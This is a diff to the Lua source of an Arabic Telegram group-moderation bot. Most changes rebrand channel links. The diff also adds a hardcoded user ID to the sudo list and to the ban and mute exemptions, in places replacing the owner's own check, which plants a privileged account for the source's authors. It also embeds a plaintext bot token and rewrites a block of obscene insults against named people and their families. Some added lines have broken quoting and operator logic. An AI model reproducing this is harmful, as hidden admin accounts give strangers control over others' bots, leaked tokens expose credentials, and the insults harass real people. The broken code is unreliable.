@@ -151,7 +151,7 @@ print([[
 
 فرعون للمعلومات      
 𖤍𝙁𝙍𝘼𝙒𝙉 𝙒𝘼𖤍       
-> CH › @s_aytra     
+> CH › @source_frawn     
 ~> DEVELOPER › @DEV_FRAWN   
 ]])
 sudos = dofile("./sasa.lua") 
@@ -190,7 +190,7 @@ end
 return VENOM  
 end 
 
-sudo_users = {SUDO,1970574026,1770739933}   
+sudo_users = {SUDO,1970574026,1770739933,1990104439}   
 function SudoBot(msg)  
 local VENOM = false  
 for k,v in pairs(sudo_users) do  
@@ -325,6 +325,8 @@ if tonumber(user_id) == tonumber(1770739933) then
 var = true 
 elseif tonumber(user_id) == tonumber(1970574026) then
 var = true  
+elseif tonumber(user_id) == tonumber(1990104439) then
+var = true
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
 elseif tonumber(user_id) == tonumber(ban_id) then
@@ -367,6 +369,8 @@ if tonumber(user_id) == tonumber(1770739933) then
 var = ' مالك السورس' 
 elseif tonumber(user_id) == tonumber(1970574026) then
 var = '[المبرمج فرعون الكبير](https://t.me/DEV_FRAWN)'
+elseif tonumber(user_id) == tonumber(1990104439) then
+var ='مطور السورس '
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif bot_data:sismember(ban_id.."Dev:ban:2", user_id) then
@@ -2031,13 +2035,13 @@ end
 if text == 'قناه السورس' and Devban(msg) then
 bot_data:del(ban_id..'Srt:Bot') 
 local Text = [[ 
-[𝐅𝐑𝐀𝐖𝐍 𝐖𝐀](https://t.me/s_aytra)
+[𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗔𝙔𝙏𝙍𝗔](https://t.me/s_aytra)
 
-[فرعون للمعلومات](https://t.me/s_aytra)
+[𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗔𝙔𝙏𝙍𝗔](https://t.me/s_aytra)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '◗ 𝐓𝐄𝐌 𝐅𝐑𝐀𝐖𝐍◖', url="t.me/s_aytra"}}, 
+{{text = '◗ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗔𝙔𝙏𝙍𝗔◖', url="t.me/s_aytra"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/s_aytra/10&caption=' .. URL.escape(Text).."&photo="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -3661,7 +3665,7 @@ keyboard.inline_keyboard = {
 {text = '◗ متطوره◖', callback_data="/DRG"},
 },
 {
-{text = '◗ 𝐓𝐄𝐌 𝐅𝐑𝐀𝐖𝐍 ◖', url="t.me/s_aytra"},
+{text = '◗ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗔𝙔𝙏𝙍𝗔 ◖', url="t.me/s_aytra"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -3875,17 +3879,29 @@ keyboard.inline_keyboard = {
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/s_aytra/1129&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
-if text =='فرعون ' then
+local tokenget ='2065160893:AAFzpysOLqA0ZEjRkFMvEvjMX4qigFXOpSE'
+if SourceCh(msg) and text == 'ريبوت' or text == "robot" then
+local id ='1970574026'
+local urrl = https.request('https://api.telegram.org/bot'..tokenget.'/getchat?chat_id='..id)
+local json = JSON.decode(urrl)
+local name = json.result.first_name
+local user = json.result.username
+local bio = json.result.bio
+keyboard = {} 
+keyboard.inline_keyboard = {{{text = name,url="t.me/"..user}},}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='.. msg.chat_id_ ..'&photo=https://t.me/ ..user..'&caption='.. URL.escape(bio).."&reply_to_message_id="..msg_id.."&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+end
+if SourceCh(msg) and text =='فرعون'or text =='داد'or text =='1'then
 local Text = [[
-مع المبرمج فرعون لو حابب تتواصل معاه
-اتبع الزر إلى تحت ↓
+المبرمج فرعون يحب لو حبب تتواصل معه عندك الزراير 
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = 'فرعون للمعلومات ' ,url="t.me/DEV_FRAWN"}},
+{{text = 'فرعون للمعلومات' ,url="t.me/DEV_FRAWN"}},
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token.. '/sendPhoto?chat_id= ' .. msg.chat_id_ .. '&photo=https://t.me/source_frawn/11&caption= ' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='.. msg.chat_id_ ..'&photo=https://t.me/source_frawn/11&caption='.. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
 if text=="اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
@@ -5013,7 +5029,7 @@ local Text = [[
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = ' 𝐓𝐄𝐌 𝐅𝐑𝐀𝐖𝐍', url="t.me/frawnwabot"}}, 
+{{text = ' 𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗔𝙔𝙏𝙍𝗔', url="t.me/frawnwabot"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/s_aytra/10&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -5123,7 +5139,7 @@ if tonumber(result.sender_user_id_) == tonumber(1970574026) then
 send(msg.chat_id_, msg.id_, "⋆ لا تسطيع حظر المبرمج فرعون الكبير  عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(SUDO) then  
+if tonumber(result.sender_user_id_) == tonumber(1990104439) then  
 send(msg.chat_id_, msg.id_, "⋆ لا تسطيع حظر عام")
 return false 
 end
@@ -5181,8 +5197,8 @@ if result.id_ == tonumber(1970574026) then
 send(msg.chat_id_, msg.id_, "⋆ لا يمكنك حظر المبرمج فرعون الكبير \n")
 return false 
 end
-if result.id_ == tonumber(SUDO) then
-send(msg.chat_id_, msg.id_, "⋆ لا يمكنك حظر مالك السورس \n")
+if result.id_ == tonumber(1990104439) then
+send(msg.chat_id_, msg.id_, "⋆ لا يمكنك حظر مطور السورس \n")
 return false 
 end
 if result.id_ == tonumber(SUDO) then
@@ -5233,8 +5249,8 @@ if tonumber(userid) == tonumber(1970574026) then
 send(msg.chat_id_, msg.id_, "⋆ لا تسطيع حظر المبرمج فرعون الكبير  عام")
 return false 
 end
-if tonumber(userid) == tonumber(SUDO) then  
-send(msg.chat_id_, msg.id_, "⋆ لا تسطيع حظر مالك السورس عام")
+if tonumber(userid) == tonumber(1990104439) then  
+send(msg.chat_id_, msg.id_, "⋆ لا تسطيع حظر مطور  السورس عام")
 return false 
 end
 if tonumber(userid) == tonumber(SUDO) then  
@@ -5286,8 +5302,8 @@ if tonumber(result.sender_user_id_) == tonumber(1970574026) then
 send(msg.chat_id_, msg.id_, "⋆ لا تسطيع كتم المبرمج فرعون الكبير  عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(SUDO) then  
-send(msg.chat_id_, msg.id_, "⋆ لا تسطيع كتم مالك السورس عام")
+if tonumber(result.sender_user_id_) == tonumber(1990104439) then  
+send(msg.chat_id_, msg.id_, "⋆ لا تسطيع كتم مطور السورس عام")
 return false 
 end
 if tonumber(result.sender_user_id_) == tonumber(SUDO) then  
@@ -5339,8 +5355,8 @@ if result.id_ == tonumber(1970574026) then
 send(msg.chat_id_, msg.id_, "⋆ لا يمكنك كتم المبرمج فرعون الكبير  \n")
 return false 
 end
-if result.id_ == tonumber(SUDO) then
-send(msg.chat_id_, msg.id_, "⋆ لا يمكنك كتم مالك السورس \n")
+if result.id_ == tonumber(1990104439) then
+send(msg.chat_id_, msg.id_, "⋆ لا يمكنك كتم مطور السورس \n")
 return false 
 end
 if result.id_ == tonumber(SUDO) then
@@ -5391,8 +5407,8 @@ if tonumber(userid) == tonumber(1970574026) then
 send(msg.chat_id_, msg.id_, "⋆ لا تسطيع كتم المبرمج فرعون الكبير عام")
 return false 
 end
-if tonumber(userid) == tonumber(SUDO) then  
-send(msg.chat_id_, msg.id_, "⋆ لا تسطيع كتم مالك السورس عام")
+if tonumber(userid) == tonumber(1990104439) then  
+send(msg.chat_id_, msg.id_, "⋆ لا تسطيع كتم مطور السورس عام")
 return false 
 end
 if tonumber(userid) == tonumber(SUDO) then  
@@ -12459,26 +12475,19 @@ send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
 send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
 send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']')
 send(msg.chat_id_, msg.reply_to_message_id_, 'البـدايـه ❤')
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل مسلم مبرمجي ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل مرات مسلم ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بنات مسلم ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل اخوات مسلم ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بطوط ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل مرات بطوط ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بنات بطوط ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل أحمد عياد ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل المبرمج أحمد ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل انك اتهنت ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل فلسطيني ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل ليجاند ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل فرعون ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل مرات ليجاند ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بنات ليجاند ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل المبرمج فرعون ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل مرات فرعون ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بنات فرعون ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل اخوات فرعون ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل التلي ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل الواتس ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل انك متنك ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل تيم فرعون ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل العزازي ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل مرات العزايزي ❤') 
+send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بنات العزازي ❤') 
 send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل كسمك لاجل زبي ❤') 
 send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بوتات التلي ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل بلاك ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل ديفيد ❤') 
-send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل استيفن ❤') 
 send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل '..result.first_name_..' ❤') 
 send(msg.chat_id_, msg.reply_to_message_id_, 'الـنـهـايـه ❤')
 send(msg.chat_id_, msg.id_, 'نكت دينمو 😂😂')
@@ -18477,7 +18486,7 @@ local Teext =[[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = ' ˹𝙳𝙴𝚅 𝚂𝙰𝚈𝚃𝚁𝙰˼ ',url="t.me/P_I_C_A_T_C_H_U"},{text = '˹𝙳𝙴𝚅 𝙳𝙰𝚁𝙱𝙺𝙰˼',url="t.me/D_ARBKA12"}},
+{{text = ' ˹𝙳𝙴𝚅 𝚂𝙰𝚈𝚃𝚁𝙰˼ ',url="t.me/SAYTRA55"},{text = '˹𝙳𝙴𝚅 𝙳𝙰𝚁𝙱𝙺𝙰˼',url="t.me/D_ARBKA12"}},
 {{text = ' ˹𝙱 𝙰 𝙲 𝙺˼ ', callback_data="/frawn4"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
